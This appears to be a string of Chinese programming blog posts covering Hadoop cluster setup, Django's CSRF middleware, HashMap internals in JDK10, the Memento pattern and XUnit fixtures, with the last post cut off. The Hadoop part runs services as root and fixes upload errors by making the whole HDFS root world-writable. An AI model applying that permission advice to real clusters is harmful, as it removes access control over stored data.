3 HADOOP_SECURE_DN_USER=yarn
4 
5 YARN_NODEMANAGER_USER=root

 
 
$ vim start-all.sh
$ vim stop-all.sh

1 TANODE_USER=root
2 HDFS_DATANODE_SECURE_USER=hdfs
3 HDFS_NAMENODE_USER=root
4 HDFS_SECONDARYNAMENODE_USER=root
5 YARN_RESOURCEMANAGER_USER=root
6 HADOOP_SECURE_DN_USER=yarn
7 YARN_NODEMANAGER_USER=root

 
配置完毕后执行start-all.sh

运行jps

显示6个进程说明配置成功

去浏览器检测一下  http://hdp-01:50070

创建目录 上传不成功需要授权

hdfs dfs -chmod -R a+wr hdfs://hdp-01:9000/

 



//查看容量hadoop fs -df -h /


 

查看各个机器状态报告

hadoop dfsadmin -report




 


********************************************************************************************************************************************************************************************************
详解Django的CSRF认证
1.csrf原理
csrf要求发送post,put或delete请求的时候，是先以get方式发送请求，服务端响应时会分配一个随机字符串给客户端，客户端第二次发送post,put或delete请求时携带上次分配的随机字符串到服务端进行校验
2.Django中的CSRF中间件
首先，我们知道Django中间件作用于整个项目。
在一个项目中，如果想对全局所有视图函数或视图类起作用时，就可以在中间件中实现，比如想实现用户登录判断，基于用户的权限管理（RBAC）等都可以在Django中间件中来进行操作
Django内置了很多中间件,其中之一就是CSRF中间件
MIDDLEWARE_CLASSES = [
    'django.middleware.security.SecurityMiddleware',
    'django.contrib.sessions.middleware.SessionMiddleware',
    'django.middleware.common.CommonMiddleware',
    'django.middleware.csrf.CsrfViewMiddleware',
    'django.contrib.auth.middleware.AuthenticationMiddleware',
    'django.contrib.auth.middleware.SessionAuthenticationMiddleware',
    'django.contrib.messages.middleware.MessageMiddleware',
    'django.middleware.clickjacking.XFrameOptionsMiddleware',
]
上面第四个就是Django内置的CSRF中间件
3.Django中间件的执行流程
Django中间件中最多可以定义5个方法
process_request
process_response
process_view
process_exception
process_template_response
Django中间件的执行顺序
1.请求进入到Django后，会按中间件的注册顺序执行每个中间件中的process_request方法
    如果所有的中间件的process_request方法都没有定义return语句，则进入路由映射，进行url匹配
    否则直接执行return语句，返回响应给客户端
2.依次按顺序执行中间件中的process_view方法
    如果某个中间件的process_view方法没有return语句，则根据第1步中匹配到的URL执行对应的视图函数或视图类
    如果某个中间件的process_view方法中定义了return语句，则后面的视图函数或视图类不会执行,程序会直接返回
3.视图函数或视图类执行完成之后，会按照中间件的注册顺序逆序执行中间件中的process_response方法
    如果中间件中定义了return语句，程序会正常执行，把视图函数或视图类的执行结果返回给客户端
    否则程序会抛出异常
4.程序在视图函数或视图类的正常执行过程中
    如果出现异常，则会执行按顺序执行中间件中的process_exception方法
    否则process_exception方法不会执行
    如果某个中间件的process_exception方法中定义了return语句，则后面的中间件中的process_exception方法不会继续执行了
5.如果视图函数或视图类中使用render方法来向客户端返回数据，则会触发中间件中的process_template_response方法
4.Django CSRF中间件的源码解析
Django CSRF中间件的源码
class CsrfViewMiddleware(MiddlewareMixin):

    def _accept(self, request):
        request.csrf_processing_done = True
        return None

    def _reject(self, request, reason):
        logger.warning(
            'Forbidden (%s): %s', reason, request.path,
            extra={
                'status_code': 403,
                'request': request,
            }
        )
        return _get_failure_view()(request, reason=reason)

    def _get_token(self, request):
        if settings.CSRF_USE_SESSIONS:
            try:
                return request.session.get(CSRF_SESSION_KEY)
            except AttributeError:
                raise ImproperlyConfigured(
                    'CSRF_USE_SESSIONS is enabled, but request.session is not '
                    'set. SessionMiddleware must appear before CsrfViewMiddleware '
                    'in MIDDLEWARE%s.' % ('_CLASSES' if settings.MIDDLEWARE is None else '')
                )
        else:
            try:
                cookie_token = request.COOKIES[settings.CSRF_COOKIE_NAME]
            except KeyError:
                return None

            csrf_token = _sanitize_token(cookie_token)
            if csrf_token != cookie_token:
                # Cookie token needed to be replaced;
                # the cookie needs to be reset.
                request.csrf_cookie_needs_reset = True
            return csrf_token

    def _set_token(self, request, response):
        if settings.CSRF_USE_SESSIONS:
            request.session[CSRF_SESSION_KEY] = request.META['CSRF_COOKIE']
        else:
            response.set_cookie(
                settings.CSRF_COOKIE_NAME,
                request.META['CSRF_COOKIE'],
                max_age=settings.CSRF_COOKIE_AGE,
                domain=settings.CSRF_COOKIE_DOMAIN,
                path=settings.CSRF_COOKIE_PATH,
                secure=settings.CSRF_COOKIE_SECURE,
                httponly=settings.CSRF_COOKIE_HTTPONLY,
            )
            patch_vary_headers(response, ('Cookie',))

    def process_request(self, request):
        csrf_token = self._get_token(request)
        if csrf_token is not None:
            # Use same token next time.
            request.META['CSRF_COOKIE'] = csrf_token

    def process_view(self, request, callback, callback_args, callback_kwargs):
        if getattr(request, 'csrf_processing_done', False):
            return None

        if getattr(callback, 'csrf_exempt', False):
            return None

        if request.method not in ('GET', 'HEAD', 'OPTIONS', 'TRACE'):
            if getattr(request, '_dont_enforce_csrf_checks', False):
                return self._accept(request)

            if request.is_secure():
                referer = force_text(
                    request.META.get('HTTP_REFERER'),
                    strings_only=True,
                    errors='replace'
                )
                if referer is None:
                    return self._reject(request, REASON_NO_REFERER)

                referer = urlparse(referer)

                if '' in (referer.scheme, referer.netloc):
                    return self._reject(request, REASON_MALFORMED_REFERER)

                if referer.scheme != 'https':
                    return self._reject(request, REASON_INSECURE_REFERER)

                good_referer = (
                    settings.SESSION_COOKIE_DOMAIN
                    if settings.CSRF_USE_SESSIONS
                    else settings.CSRF_COOKIE_DOMAIN
                )
                if good_referer is not None:
                    server_port = request.get_port()
                    if server_port not in ('443', '80'):
                        good_referer = '%s:%s' % (good_referer, server_port)
                else:
                    good_referer = request.get_host()

                good_hosts = list(settings.CSRF_TRUSTED_ORIGINS)
                good_hosts.append(good_referer)

                if not any(is_same_domain(referer.netloc, host) for host in good_hosts):
                    reason = REASON_BAD_REFERER % referer.geturl()
                    return self._reject(request, reason)

            csrf_token = request.META.get('CSRF_COOKIE')
            if csrf_token is None:
                return self._reject(request, REASON_NO_CSRF_COOKIE)

            request_csrf_token = ""
            if request.method == "POST":
                try:
                    request_csrf_token = request.POST.get('csrfmiddlewaretoken', '')
                except IOError:
                    pass

            if request_csrf_token == "":
                request_csrf_token = request.META.get(settings.CSRF_HEADER_NAME, '')

            request_csrf_token = _sanitize_token(request_csrf_token)
            if not _compare_salted_tokens(request_csrf_token, csrf_token):
                return self._reject(request, REASON_BAD_TOKEN)

        return self._accept(request)

    def process_response(self, request, response):
        if not getattr(request, 'csrf_cookie_needs_reset', False):
            if getattr(response, 'csrf_cookie_set', False):
                return response

        if not request.META.get("CSRF_COOKIE_USED", False):
            return response

        self._set_token(request, response)
        response.csrf_cookie_set = True
        return response
从上面的源码中可以看到，CsrfViewMiddleware中间件中定义了process_request，process_view和process_response三个方法
先来看process_request方法
def _get_token(self, request):  
    if settings.CSRF_USE_SESSIONS:  
        try:  
            return request.session.get(CSRF_SESSION_KEY)  
        except AttributeError:  
            raise ImproperlyConfigured(  
                'CSRF_USE_SESSIONS is enabled, but request.session is not '  
 'set. SessionMiddleware must appear before CsrfViewMiddleware ' 'in MIDDLEWARE%s.' % ('_CLASSES' if settings.MIDDLEWARE is None else '')  
            )  
    else:  
        try:  
            cookie_token = request.COOKIES[settings.CSRF_COOKIE_NAME]  
        except KeyError:  
            return None  
  
  csrf_token = _sanitize_token(cookie_token)  
        if csrf_token != cookie_token:  
            # Cookie token needed to be replaced;  
 # the cookie needs to be reset.  request.csrf_cookie_needs_reset = True  
 return csrf_token

def process_request(self, request):  
        csrf_token = self._get_token(request)  
        if csrf_token is not None:  
            # Use same token next time.  
      request.META['CSRF_COOKIE'] = csrf_token
从Django项目配置文件夹中读取CSRF_USE_SESSIONS的值，如果获取成功，则从session中读取CSRF_SESSION_KEY的值，默认为'_csrftoken'，如果没有获取到CSRF_USE_SESSIONS的值，则从发送过来的请求中获取CSRF_COOKIE_NAME的值，如果没有定义则返回None。
再来看process_view方法
在process_view方法中，先检查视图函数是否被csrf_exempt装饰器装饰，如果视图函数没有被csrf_exempt装饰器装饰，则程序继续执行，否则返回None。接着从request请求头中或者cookie中获取携带的token并进行验证，验证通过才会继续执行与URL匹配的视图函数，否则就返回403 Forbidden错误。
实际项目中，会在发送POST,PUT,DELETE,PATCH请求时，在提交的form表单中添加
{% csrf_token %}
即可，否则会出现403的错误

5.csrf_exempt装饰器和csrf_protect装饰器
5.1 基于Django FBV
在一个项目中，如果注册起用了CsrfViewMiddleware中间件，则项目中所有的视图函数和视图类在执行过程中都要进行CSRF验证。
此时想使某个视图函数或视图类不进行CSRF验证，则可以使用csrf_exempt装饰器装饰不想进行CSRF验证的视图函数
from django.views.decorators.csrf import csrf_exempt

@csrf_exempt  
def index(request):  
    pass
也可以把csrf_exempt装饰器直接加在URL路由映射中，使某个视图函数不经过CSRF验证
from django.views.decorators.csrf import csrf_exempt  
  
from users import views  
 
urlpatterns = [  
    url(r'^admin/', admin.site.urls),  
    url(r'^index/',csrf_exempt(views.index)),  
]
同样的，如果在一个Django项目中，没有注册起用CsrfViewMiddleware中间件，但是想让某个视图函数进行CSRF验证，则可以使用csrf_protect装饰器
csrf_protect装饰器的用法跟csrf_exempt装饰器用法相同，都可以加上视图函数上方装饰视图函数或者在URL路由映射中直接装饰视图函数
from django.views.decorators.csrf import csrf_exempt  

@csrf_protect  
def index(request):  
    pass
或者
from django.views.decorators.csrf import csrf_protect  
  
from users import views  
 
urlpatterns = [  
    url(r'^admin/', admin.site.urls),  
    url(r'^index/',csrf_protect(views.index)),  
]
5.1 基于Django CBV
上面的情况是基于Django FBV的，如果是基于Django CBV，则不可以直接加在视图类的视图函数中了
此时有三种方式来对Django CBV进行CSRF验证或者不进行CSRF验证
方法一，在视图类中定义dispatch方法，为dispatch方法加csrf_exempt装饰器
from django.views.decorators.csrf import csrf_exempt
from django.utils.decorators import method_decorator

class UserAuthView(View):

    @method_decorator(csrf_exempt)
    def dispatch(self, request, *args, **kwargs):
        return super(UserAuthView,self).dispatch(request,*args,**kwargs)

    def get(self,request,*args,**kwargs):
        pass

    def post(self,request,*args,**kwargs):
        pass

    def put(self,request,*args,**kwargs):
        pass

    def delete(self,request,*args,**kwargs):
        pass
方法二：为视图类上方添加装饰器
@method_decorator(csrf_exempt,name='dispatch')
class UserAuthView(View):
    def get(self,request,*args,**kwargs):
        pass

    def post(self,request,*args,**kwargs):
        pass

    def put(self,request,*args,**kwargs):
        pass

    def delete(self,request,*args,**kwargs):
        pass
方式三：在url.py中为类添加装饰器
from django.views.decorators.csrf import csrf_exempt

urlpatterns = [
    url(r'^admin/', admin.site.urls),
    url(r'^auth/', csrf_exempt(views.UserAuthView.as_view())),
]

csrf_protect装饰器的用法跟上面一样


********************************************************************************************************************************************************************************************************
JDK10源码分析之HashMap
HashMap在工作中大量使用，但是具体原理和实现是如何的呢？技术细节是什么？带着很多疑问，我们来看下JDK10源码吧。
1、数据结构
　　采用Node<K,V>[]数组，其中，Node<K,V>这个类实现Map.Entry<K,V>，是一个链表结构的对象，并且在一定条件下，会将链表结构变为红黑树。所以，JDK10采用的是数组+链表+红黑树的数据结构。贴上Node的源码

 static class Node<K,V> implements Map.Entry<K,V> {
        final int hash;
        final K key;
        V value;
        Node<K,V> next;

        Node(int hash, K key, V value, Node<K,V> next) {
            this.hash = hash;
            this.key = key;
            this.value = value;
            this.next = next;
        }

        public final K getKey()        { return key; }
        public final V getValue()      { return value; }
        public final String toString() { return key + "=" + value; }

        public final int hashCode() {
            return Objects.hashCode(key) ^ Objects.hashCode(value);
        }

        public final V setValue(V newValue) {
            V oldValue = value;
            value = newValue;
            return oldValue;
        }

        public final boolean equals(Object o) {
            if (o == this)
                return true;
            if (o instanceof Map.Entry) {
                Map.Entry<?,?> e = (Map.Entry<?,?>)o;
                if (Objects.equals(key, e.getKey()) &&
                    Objects.equals(value, e.getValue()))
                    return true;
            }
            return false;
        }
    }

 
2、静态变量（默认值）

DEFAULT_INITIAL_CAPACITY= 1 << 4：初始化数组默认长度。1左移4位，为16。
MAXIMUM_CAPACITY = 1 << 30：初始化默认容量大小，2的30次方。
DEFAULT_LOAD_FACTOR = 0.75f：负载因子，用于和数组长度相乘，当数组长度大于得到的值后，会进行数组的扩容，扩容倍数是2^n。
TREEIFY_THRESHOLD = 8：链表长度达到该值后，会进行数据结构转换，变成红黑树，优化速率。
UNTREEIFY_THRESHOLD = 6：红黑树的数量小于6时，在resize中，会转换成链表。

3、构造函数

 /**
     * Constructs an empty {@code HashMap} with the specified initial
     * capacity and load factor.
     *
     * @param  initialCapacity the initial capacity
     * @param  loadFactor      the load factor
     * @throws IllegalArgumentException if the initial capacity is negative
     *         or the load factor is nonpositive
     */
    public HashMap(int initialCapacity, float loadFactor) {
        if (initialCapacity < 0)
            throw new IllegalArgumentException("Illegal initial capacity: " +
                                               initialCapacity);
        if (initialCapacity > MAXIMUM_CAPACITY)
            initialCapacity = MAXIMUM_CAPACITY;
        if (loadFactor <= 0 || Float.isNaN(loadFactor))
            throw new IllegalArgumentException("Illegal load factor: " +
                                               loadFactor);
        this.loadFactor = loadFactor;
        this.threshold = tableSizeFor(initialCapacity);
    }

    /**
     * Constructs an empty {@code HashMap} with the specified initial
     * capacity and the default load factor (0.75).
     *
     * @param  initialCapacity the initial capacity.
     * @throws IllegalArgumentException if the initial capacity is negative.
     */
    public HashMap(int initialCapacity) {
        this(initialCapacity, DEFAULT_LOAD_FACTOR);
    }

    /**
     * Constructs an empty {@code HashMap} with the default initial capacity
     * (16) and the default load factor (0.75).
     */
    public HashMap() {
        this.loadFactor = DEFAULT_LOAD_FACTOR; // all other fields defaulted
    }

    /**
     * Constructs a new {@code HashMap} with the same mappings as the
     * specified {@code Map}.  The {@code HashMap} is created with
     * default load factor (0.75) and an initial capacity sufficient to
     * hold the mappings in the specified {@code Map}.
     *
     * @param   m the map whose mappings are to be placed in this map
     * @throws  NullPointerException if the specified map is null
     */
    public HashMap(Map<? extends K, ? extends V> m) {
        this.loadFactor = DEFAULT_LOAD_FACTOR;
        putMapEntries(m, false);
    }

　　四个构造函数，这里不细说，主要说明一下一个方法。
　　1、tableSizeFor(initialCapacity)
　　
　　

  static final int tableSizeFor(int cap) {
        int n = cap - 1;
        n |= n >>> 1;
        n |= n >>> 2;
        n |= n >>> 4;
        n |= n >>> 8;
        n |= n >>> 16;
        return (n < 0) ? 1 : (n >= MAXIMUM_CAPACITY) ? MAXIMUM_CAPACITY : n + 1;
    }

　　这个方法返回一个2^n的值，用于初始化数组的大小，可以看到，入参的数值不是实际的数组长度，是经过计算得来的大于该值的第一个2^n值，并且，计算后大于2^30时，直接返回2^30。来说明下这个算法的原理，为什么会返回2^n。至于返回2^n有什么用，后面会有说明。
　　为什么会得到2^n，举个例子。比如13。13的2进制是0000 1101，上面运算相当于以下算式。
　　0000 1101        右移一位  0000 0110 ，取或0000 1111  一直运算下去，最后+1，确实是2^n。
　　下面，由于是取或，我们现在只关心二进制最高位的1，后面不管是1或0，都先不看，我们来看以下运算。
　　000...  1 ...  右移一位与原值取或后，得到 000... 11 ...
　　000... 11 ... 右移两位与原值取或后，得到 000... 11 11 ...
　　000... 1111 ... 右移四位与原值取或后，得到 000... 1111 1111 ...
　　以此下去，在32位范围内的值，通过这样移动后，相当于用最高位的1，将之后的所有值，都补为1，得到一个2^n-1的值。最后+1自然是2^n。
4、主要方法

put(K key, V value)

  final V putVal(int hash, K key, V value, boolean onlyIfAbsent,
                   boolean evict) {
        Node<K,V>[] tab; Node<K,V> p; int n, i;
        if ((tab = table) == null || (n = tab.length) == 0)
           //如果数组未初始化，则初始化数组长度
            n = (tab = resize()).length;
       //计算key的hash值，落在数组的哪一个区间，如果不存在则新建Node元素
        if ((p = tab[i = (n - 1) & hash]) == null)
            tab[i] = newNode(hash, key, value, null);
        else {
            Node<K,V> e; K k;
            //数组存在的情况下，判断key是否已有，如果存在，则返回该值
            if (p.hash == hash &&
                ((k = p.key) == key || (key != null && key.equals(k))))
                e = p;
           //如果p是红黑树，则直接加入红黑树中
            else if (p instanceof TreeNode)
                e = ((TreeNode<K,V>)p).putTreeVal(this, tab, hash, key, value);
            else {
                //如果不是红黑树，则遍历链表
                for (int binCount = 0; ; ++binCount) {
                   //如果p的next（链表中的下一个值）为空，则直接追加在该值后面
                    if ((e = p.next) == null) {
                        p.next = newNode(hash, key, value, null);
                       //如果该链表存完之后，长度大于8，则转换为红黑树
                        if (binCount >= TREEIFY_THRESHOLD - 1) // -1 for 1st
                            treeifyBin(tab, hash);
                        break;
                    }
                    //如果next不为空，则比较该链表节点时候就是存入的key，如果是，直接返回
                    if (e.hash == hash &&
                        ((k = e.key) == key || (key != null && key.equals(k))))
                        break;
                    p = e;
                }
            }
            //如果存在相同的key，则直接返回该值。
            if (e != null) { // existing mapping for key
                V oldValue = e.value;
                if (!onlyIfAbsent || oldValue == null)
                    e.value = value;
                afterNodeAccess(e);
                return oldValue;
            }
        }
        ++modCount;
        //数组中元素个数如果大于数组容量*负载因子，则触发数组resize操作。
        if (++size > threshold)
            resize();
        afterNodeInsertion(evict);
        return null;
    }

 
HashMap，hash是散列算法，所以HashMap中，主要也用了散列的原理。就是将数据通过hash的散列算法计算其分布情况，存入map中。上面是put的代码，可以看出主要的流程是：初始化一个Node数组，长度为2^n，计算key值落在数组的位置，如果该位置没有Node元素，则用该key建立一个Node插入，如果存在hash碰撞，即不同key计算后的值落在了同一位置，则将该值存到Node链表中。其余具体细节，在上面源码中已经标注。

hash(key)

　　计算put的hash入参，源码如下：

 static final int hash(Object key) {
        int h;
        return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);
    }

　　可以看到，用到了key的hashCode方法，这个不细说，主要是计算key的散列值。主要讲一下后面为什么要和h右移16后相异或。实际上，是为了让这个hashCode的二进制值的1分布更散列一些。因为后面的运算需要，需要这样做（为什么后面的运算需要让1分散，这个我们下面会讲）。下面我们来看，为什么这样运算后，会增加1的散列性。可以看到，16位以内的二进制hashCode和它右移16位后取异或得到的值是一样的。我们举例时，用8位二进制和它右移4位取异或来举例，
比如          1101 1000 0001 0101，
右移8位为 0000 0000 1101 1000，
取异或后   1101 1000 1100 1101，可以看到1的分布更均匀了一些。
举个极端点的例子  1000 0000 0000 0000
右移8为                  0000 0000 1000 0000
取异或后                1000 0000 1000 0000，可以明显看到，1多了一个。所以这样运算是有一定效果的，使hash碰撞的几率要低了一些。
　　3. resize()
　　该方法在数组初始化，数组扩容，转换红黑树（treeifyBin中，if (tab == null || (n = tab.length) < MIN_TREEIFY_CAPACITY) resize();）中会触发。主要用于数组长度的扩展2倍，和数据的重新分布。源码如下
　　
　　

  final Node<K,V>[] resize() {
        Node<K,V>[] oldTab = table;
        int oldCap = (oldTab == null) ? 0 : oldTab.length;
        int oldThr = threshold;
        int newCap, newThr = 0;
        if (oldCap > 0) {
            //如果原数组存在，且大于2^30，则设置数组长度为0x7fffffff
            if (oldCap >= MAXIMUM_CAPACITY) {
                threshold = Integer.MAX_VALUE;
                return oldTab;
            }
            //如果原数组存在，则将其长度扩展为2倍。
            else if ((newCap = oldCap << 1) < MAXIMUM_CAPACITY &&
                     oldCap >= DEFAULT_INITIAL_CAPACITY)
                newThr = oldThr << 1; // double threshold
        }
        else if (oldThr > 0) // initial capacity was placed in threshold
            newCap = oldThr;
        else {               // zero initial threshold signifies using defaults
            newCap = DEFAULT_INITIAL_CAPACITY;
            newThr = (int)(DEFAULT_LOAD_FACTOR * DEFAULT_INITIAL_CAPACITY);
        }
        if (newThr == 0) {
            float ft = (float)newCap * loadFactor;
            newThr = (newCap < MAXIMUM_CAPACITY && ft < (float)MAXIMUM_CAPACITY ?
                      (int)ft : Integer.MAX_VALUE);
        }
        threshold = newThr;
        @SuppressWarnings({"rawtypes","unchecked"})
        Node<K,V>[] newTab = (Node<K,V>[])new Node[newCap];
        table = newTab;
       //如果原数组不为空，则取出数组中的元素，进行hash位置的重新计算，可以看到，重新计算耗时较多，所以尽量用多大数组就初始化多大最好。
        if (oldTab != null) {
            for (int j = 0; j < oldCap; ++j) {
                Node<K,V> e;
                if ((e = oldTab[j]) != null) {
                    oldTab[j] = null;
                    if (e.next == null)
                        newTab[e.hash & (newCap - 1)] = e;
                    else if (e instanceof TreeNode)
                        ((TreeNode<K,V>)e).split(this, newTab, j, oldCap);
                    else { // preserve order
                        Node<K,V> loHead = null, loTail = null;
                        Node<K,V> hiHead = null, hiTail = null;
                        Node<K,V> next;
                        do {
                            next = e.next;
                            if ((e.hash & oldCap) == 0) {
                                if (loTail == null)
                                    loHead = e;
                                else
                                    loTail.next = e;
                                loTail = e;
                            }
                            else {
                                if (hiTail == null)
                                    hiHead = e;
                                else
                                    hiTail.next = e;
                                hiTail = e;
                            }
                        } while ((e = next) != null);
                        if (loTail != null) {
                            loTail.next = null;
                            newTab[j] = loHead;
                        }
                        if (hiTail != null) {
                            hiTail.next = null;
                            newTab[j + oldCap] = hiHead;
                        }
                    }
                }
            }
        }
        return newTab;
    } 

　　4. p = tab[i = (n - 1) & hash]
　　计算key的hash落在数组的哪个位置，它决定了数组长度为什么是2^n。主要是(n-1) & hash，这里就会用到上面hash()方法中，让1散列的作用。这个方法也决定了，为什么数组长度为2^n，下面我们具体解释一下。由于初始化中，n的值是resize方法返回的，resize中用到的就是tableSizeFor方法返回的2^n的值。如16，下面我举例说明，如数组长度是16：则n-1为15，二进制是 0000 1111与hash取与时，由于0与1/0都为0，所以我们只看后四位1111和hash的后四位。可以看到，与1111取与，可以得到0-15的值，这时，保证了hash能实现落在数组的所有下标。假想一下，如果数组长度为15或其他非二进制值，15-1=14,14的二进制为1110，由于最后一位是0，和任何二进制取与，最后一位都是0，则hash落不到数组下标为0,2,4,6,8,10,12,14的偶数下标，这样数据分布会更集中，加重每个下标Node的负担，且数组中很多下标无法利用。源码作者正是利用了2^n-1，得到二进制最后全为1，并且与hash相与后，能让hash分布覆盖数组所有下标上的特性。之前hash()方法通过HashCode与HashCode右移16位取异或，让1分布更加均匀，也是为了让hash在数组中的分布更加均匀，从而避免某个下标Node元素过多，效率下降，且过多元素会触发resize耗费时间的缺点，当然，可以看到极端情况下，hash()计算的值并不能解决hash碰撞问题，但是为了HashMap的性能设计者没有考虑该极端情况，也是通过16位hashCode右移8位来举例说明。
如：          1000 1000 0000 0000和1000 1100 0000 0000，如果不移位取异或，这两个hash值与1111取与，都是分布在同一位置，分布情况不良好。
右移8位： 1000 1000 1000 1000和1000 1100 1000 1100，可以看到两个值与1111取与分布在数组的两个下标。
极端情况：1000 0000 0000 0000和1100 0000 0000 0000，该值又移8为取异或后，并不能解决hash碰撞。
 
 
　　　     
 
 
　　
********************************************************************************************************************************************************************************************************
设计模式-备忘录模式
备忘录模式 : Memento
声明/作用 : 保存对象的内部状态,并在需要的时候(undo/rollback) 恢复到对象以前的状态
适用场景 : 一个对象需要保存状态,并且可通过undo或者rollback恢复到以前的状态时,可以使用备忘录模式
经典场景 : 某时刻游戏存档恢复记录
需要被保存内部状态以便恢复的这个类 叫做 : Originator 发起人(原生者)
用来保存Originator内部状态的类 叫做 : Memento 备忘录(回忆者) 它由Originator创建
负责管理备忘录Memento的类叫做 : Caretaker 看管者(管理者),它不能对Memento的内容进行访问或者操作。
以Person对象(拥有name,sex,age三个基本属性)为例 : 

package name.ealen.memento.noDesignPattern;

/**
 * Created by EalenXie on 2018/9/27 15:18.
 */
public class Person {

    private String name;
    private String sex;
    private Integer age;

    public Person(String name, String sex, Integer age) {
        this.name = name;
        this.sex = sex;
        this.age = age;
    }
    //省略getter,setter
}

 
如果不使用设计模式，我们要对其进行备份，undo操作 ,常规情况下，我们可能会写出如下的代码 : 
 

 /**
     * 不使用设计模式 实现备忘录模式,普通保存实例的内部状态
     */
    @Test
    public void noDesignPattern() {
        Person person = new Person("ealenxie", "男", 23);

        //1 . 首先新建一个Person的Backup备份,将对象的初始属性赋值进去
        Person backup = new Person();
        backup.setName(person.getName());
        backup.setSex(person.getSex());
        backup.setAge(person.getAge());
        //打印初始的person
        System.out.println("初始化的对象 : " + person);

        //2 . 修改person
        person.setAge(22);
        person.setName("ZHANG SAN");
        person.setSex("女");
        System.out.println("修改后的对象 : " + person);

        //3 . 回滚(回复以前状态) 从backup中获取之前的状态,重新赋值
        person.setAge(backup.getAge());
        person.setName(backup.getName());
        person.setSex(backup.getSex());
        System.out.println("还原后的对象 : " + person);
    }

运行可以看到基本效果 :  
　　　　
以上代码中，我们首先进行了创建了一个初始对象person，然后new出一个新的backup，将初始对象的属性赋给backup，person修改之后，如果进行undo/rollback，就将backup的属性重新赋值给对象person。这样做我们必须要关注person和backup之间的赋值关系必须一致且值正确，这样才能完成rollback动作；如果person对象拥有诸多属性及行为的话，很显示不是特别的合理。
 
如下，我们使用备忘录模式来完成对象的备份和rollback
　　1 . 首先，我们定义Memento对象，它的作用就是用来保存 初始对象(原生者，此例比如person)的内部状态，因此它的属性和原生者应该一致。

package name.ealen.memento.designPattern;

/**
 * Created by EalenXie on 2018/9/27 18:03.
 */
public class Memento {
    private String name;
    private String sex;
    private Integer age;
    public Memento(String name, String sex, Integer age) {
        this.name = name;
        this.sex = sex;
        this.age = age;
    }
    //省略getter/setter
}

 
　　2 . 然后，定义我们的发起人(原生者) Originator，它拥有两个基本的行为 : 
　　　　1). 创建备份
　　　　2). 根据备份进行rollback

package name.ealen.memento.designPattern;

/**
 * Created by EalenXie on 2018/9/27 18:02.
 */
public class Originator {

    private String name;
    private String sex;
    private Integer age;

    //创建一个备份
    public Memento createMemento() {
        return new Memento(name, sex, age);
    }

    //根据备份进行rollback
    public void rollbackByMemento(Memento memento) {
        this.name = memento.getName();
        this.sex = memento.getSex();
        this.age = memento.getAge();
    }

    public String getName() {
        return name;
    }

    public void setName(String name) {
        this.name = name;
    }

    public String getSex() {
        return sex;
    }

    public void setSex(String sex) {
        this.sex = sex;
    }

    public Integer getAge() {
        return age;
    }

    public void setAge(Integer age) {
        this.age = age;
    }

    public Originator(String name, String sex, Integer age) {
        this.name = name;
        this.sex = sex;
        this.age = age;
    }

    @Override
    public String toString() {
        return "Originator{" +
                "name='" + name + '\'' +
                ", sex='" + sex + '\'' +
                ", age=" + age +
                '}';
    }
}

 
　　3 . 为了防止发起者与备份对象的过度耦合，以及防止对发起者行和属性进行过多的代码侵入，我们通常将Memento对象交由CareTaker来进行管理 : 
 

package name.ealen.memento.designPattern;

import java.util.HashMap;
import java.util.Map;

/**
 * Created by EalenXie on 2018/9/27 17:39.
 */
public class CareTaker {

    private Map<String, Memento> mementos = new HashMap<>(); //一个或者多个备份录

    //保存默认备份
    public void saveDefaultMemento(Memento memento) {
        mementos.put("default", memento);
    }

    //获取默认备份
    public Memento getMementoByDefault() {
        return mementos.get("default");
    }

    //根据备份名 保存备份
    public void saveMementoByName(String mementoName, Memento memento) {
        mementos.put(mementoName, memento);
    }

    //根据备份名 获取备份
    public Memento getMementoByName(String mementoName) {
        return mementos.get(mementoName);
    }

    //删除默认备份
    public void deleteDefaultMemento() {
        mementos.remove("default");
    }

    //根据备份名 删除备份
    public void deleteMementoByName(String mementoName) {
        mementos.remove(mementoName);
    }
}

 
　　4 . 此时，我们要进行备份以及rollback，做法如下 : 
 

    /**
     * 备忘录模式,标准实现
     */
    @Test
    public void designPattern() {
        Originator originator = new Originator("ealenxie", "男", 22);
        CareTaker careTaker = new CareTaker();

        //新建一个默认备份,将Originator的初始属性赋值进去
        careTaker.saveDefaultMemento(originator.createMemento());

        //初始化的Originator
        System.out.println("初始化的对象 : " + originator);

        //修改后的Originator
        originator.setName("ZHANG SAN");
        originator.setSex("女");
        originator.setAge(23);
        System.out.println("第一次修改后的对象 : " + originator);

        //新建一个修改后的备份
        careTaker.saveMementoByName("第一次修改备份", originator.createMemento());

        //根据默认备份还原rollback后的Originator
        originator.rollbackByMemento(careTaker.getMementoByDefault());
        System.out.println("还原后的对象 : " + originator);

        //根据备份名还原rollback后的Originator
        originator.rollbackByMemento(careTaker.getMementoByName("第一次修改备份"));
        System.out.println("第一次修改备份 : " + originator);

        //再创建一个默认备份
        careTaker.saveDefaultMemento(originator.createMemento());
        originator.rollbackByMemento(careTaker.getMementoByDefault());
        System.out.println("最后创建的默认备份 : " + originator);
    }

 
运行可以看到如下结果 : 
　　
 以上，使用备忘录的设计模式，好处是显而易见的，我们应该关注的是对象本身具有的(备份/rollback)的行为，而非对象之间的赋值。
 有兴趣的朋友可以看看以上源码 : https://github.com/EalenXie/DesignPatterns 
********************************************************************************************************************************************************************************************************
XUnit 依赖注入
XUnit 依赖注入
Intro
现在的开发中越来越看重依赖注入的思想，微软的 Asp.Net Core 框架更是天然集成了依赖注入，那么在单元测试中如何使用依赖注入呢？
本文主要介绍如何通过 XUnit 来实现依赖注入， XUnit 主要借助 SharedContext 来共享一部分资源包括这些资源的创建以及释放。
Scoped
针对 Scoped 的对象可以借助 XUnit 中的 IClassFixture 来实现

定义自己的 Fixture，需要初始化的资源在构造方法里初始化，如果需要在测试结束的时候释放资源需要实现 IDisposable 接口
需要依赖注入的测试类实现接口 IClassFixture<Fixture>
在构造方法中注入实现的 Fixture 对象，并在构造方法中使用 Fixture 对象中暴露的公共成员

Singleton
针对 Singleton 的对象可以借助 XUnit 中的 ICollectionFixture 来实现

定义自己的 Fixture，需要初始化的资源在构造方法里初始化，如果需要在测试结束的时候释放资源需要实现 IDisposable 接口
创建 CollectionDefinition，实现接口 ICollectionFixture<Fixture>，并添加一个 [CollectionDefinition("CollectionName")] Attribute，CollectionName 需要在整个测试中唯一，不能出现重复的 CollectionName
在需要注入的测试类中添加 [Collection("CollectionName")] Attribute，然后在构造方法中注入对应的 Fixture

Tips

如果有多个类需要依赖注入，可以通过一个基类来做，这样就只需要一个基类上添加 [Collection("CollectionName")] Attribute，其他类只需要集成这个基类就可以了

Samples
Scoped Sample
这里直接以 XUnit 的示例为例：
